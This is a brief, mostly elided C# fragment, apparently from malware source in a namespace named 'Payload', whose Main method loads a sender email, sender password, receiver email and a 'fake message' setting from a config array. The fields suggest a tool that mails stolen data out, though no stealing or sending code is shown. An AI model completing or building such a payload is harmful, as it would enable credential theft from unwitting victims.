...
namespace Payload
{
    class Program
    {
        ...
        private static readonly bool FirstTime = true;
        #endregion
        ...
        static void Main()
        {
            ...
            else
            {
                ...
                try
                {
                    SenderEmail = Config[1];
                    SenderEmailPassword = Config[2];
                    RecieverEmail = Config[3];
                    fakeMessageConfigs = Config[3];
                }
                catch (Exception) { }
                #endregion
            }
